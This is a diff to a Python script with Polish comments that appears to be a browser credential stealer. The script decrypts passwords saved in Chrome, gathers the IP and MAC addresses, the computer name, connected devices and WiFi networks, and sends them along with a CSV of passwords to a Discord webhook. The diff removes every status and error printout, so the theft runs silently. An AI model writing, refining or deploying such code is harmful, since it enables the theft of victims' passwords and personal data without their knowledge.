@@ -27,8 +27,7 @@ def get_secret_key():
             secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
             return secret_key
     except Exception as e:
-        print(f"[ERR] {str(e)}")
-        print("[ERR] Nie można znaleźć klucza sekretnego Chrome")
+       
         return None
 
 # Funkcja do odszyfrowywania hasła
@@ -40,8 +39,7 @@ def decrypt_password(ciphertext, secret_key):
         decrypted_password = cipher.decrypt(encrypted_password)
         return decrypted_password.rstrip(b'\x00').decode('utf-8', errors='ignore')
     except Exception as e:
-        print(f"[ERR] {str(e)}")
-        print("[ERR] Nie można odszyfrować hasła")
+       
         return ""
 
 # Funkcja do uzyskiwania połączenia z bazą danych haseł Chrome
@@ -50,8 +48,7 @@ def get_db_connection(chrome_path_login_db):
         shutil.copy2(chrome_path_login_db, "Loginvault.db")
         return sqlite3.connect("Loginvault.db")
     except Exception as e:
-        print(f"[ERR] {str(e)}")
-        print("[ERR] Nie można znaleźć bazy danych Chrome")
+       
         return None
 
 # Funkcja do uzyskiwania zewnętrznego adresu IPv4
@@ -60,23 +57,23 @@ def get_external_ipv4_address():
         response = requests.get('https://api64.ipify.org?format=json')
         if response.status_code == 200:
             external_ip = response.json()['ip']
-            print(f"Zewnętrzny adres IPv4: {external_ip}")
+           
             return external_ip
         else:
-            print(f"Błąd podczas pobierania zewnętrznego adresu IPv4. Kod statusu: {response.status_code}")
+          
             return None
     except Exception as e:
-        print(f"Błąd podczas pobierania zewnętrznego adresu IPv4: {str(e)}")
+        
         return None
 
 # Funkcja do uzyskiwania adresu IPv6
 def get_ipv6_address():
     try:
         ipv6_address = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
-        print(f"Adres IPv6: {ipv6_address}")
+       
         return ipv6_address
     except Exception as e:
-        print(f"Błąd podczas pobierania adresu IPv6: {str(e)}")
+       
         return None
 
 # Funkcja do uzyskiwania adresu MAC
@@ -86,7 +83,7 @@ def get_mac_address():
         print(f"Adres MAC: {mac_address}")
         return mac_address
     except Exception as e:
-        print(f"Błąd podczas pobierania adresu MAC: {str(e)}")
+     
         return None
 
 # Funkcja do uzyskiwania nazwy komputera
@@ -96,7 +93,7 @@ def get_computer_name():
         print(f"Nazwa komputera: {computer_name}")
         return computer_name
     except Exception as e:
-        print(f"Błąd podczas pobierania nazwy komputera: {str(e)}")
+       
         return None
 
 # Funkcja do uzyskiwania informacji o połączonych urządzeniach
@@ -115,7 +112,6 @@ def get_connected_devices():
                     devices.append({"IP Address": ip_address, "MAC Address": mac_address})
         return devices
     except Exception as e:
-        print(f"Błąd podczas pobierania informacji o urządzeniach: {str(e)}")
         return []
 
 # Funkcja do uzyskiwania informacji o dostępnych sieciach WiFi
@@ -141,7 +137,6 @@ def get_wifi_networks():
             networks.append(network_info)
         return networks
     except Exception as e:
-        print(f"Błąd podczas pobierania informacji o sieciach WiFi: {str(e)}")
         return []
 
 if __name__ == '__main__':
@@ -174,9 +169,6 @@ if __name__ == '__main__':
                         if url and username and ciphertext:
                             # Odszyfruj hasło
                             decrypted_password = decrypt_password(ciphertext, secret_key)
-                            print(f"Index: {index}")
-                            print(f"URL: {url}\nuser: {username}\npassword + random symbols (to don't get banned on discord): {decrypted_password}\n")
-                            print("*" * 50)
                             # Zapisz odszyfrowane hasło do pliku CSV
                             csv_writer.writerow([index, url.encode('utf-8'), username.encode('utf-8'), decrypted_password.encode('utf-8')])
                     # Zamknij połączenie z bazą danych
@@ -185,7 +177,7 @@ if __name__ == '__main__':
                     # Usuń tymczasową bazę danych logowania
                     os.remove("Loginvault.db")
 
-        print("Plik CSV został utworzony.")
+
 
         # Pobierz dane z Discord webhooka
         external_ipv4_address = get_external_ipv4_address()
@@ -204,21 +196,13 @@ if __name__ == '__main__':
             webhook_url = 'WEBHOOK_URL'
             response = requests.post(webhook_url, json=data)
 
-            if response.status_code == 204:
-                print("Dane zostały wysłane na Discord webhook.")
-            else:
-                print(f"Błąd podczas wysyłania danych na Discord webhook. Kod statusu: {response.status_code}")
 
             # Wyślij plik CSV jako załącznik
             files = {'file': open(csv_file_path, 'rb')}
             response = requests.post(webhook_url, files=files)
 
-            if response.status_code == 204:
-                print("Plik CSV został wysłany na Discord webhook.")
-            else:
-                print(f"Błąd podczas wysyłania pliku CSV na Discord webhook. Kod statusu: {response.status_code}")
-        else:
-            print("Nie udało się pobrać wszystkich danych.")
+
+
 
         # Pobierz informacje o połączonych urządzeniach
         connected_devices = get_connected_devices()
@@ -230,13 +214,6 @@ if __name__ == '__main__':
             # Wyślij dane na Discord webhook
             response = requests.post(webhook_url, json=data)
 
-            if response.status_code == 204:
-                print("Informacje o urządzeniach zostały wysłane na Discord webhook.")
-            else:
-                print(f"Błąd podczas wysyłania informacji o urządzeniach na Discord webhook. Kod statusu: {response.status_code}")
-        else:
-            print("Brak informacji o połączonych urządzeniach.")
-
         # Pobierz informacje o dostępnych sieciach WiFi
         wifi_networks = get_wifi_networks()
         if wifi_networks:
@@ -247,14 +224,7 @@ if __name__ == '__main__':
             # Wyślij dane na Discord webhook
             response = requests.post(webhook_url, json=data)
 
-            if response.status_code == 204:
-                print("Informacje o sieciach WiFi zostały wysłane na Discord webhook.")
-            else:
-                print(f"Błąd podczas wysyłania informacji o sieciach WiFi na Discord webhook. Kod statusu: {response.status_code}")
-        else:
-            print("Brak informacji o dostępnych sieciach WiFi.")
-    except Exception as e:
-        print(f"[ERR] {str(e)}")
+          
     finally:
         # Wyczyść tymczasowy katalog
         shutil.rmtree(temp_dir, ignore_errors=True)
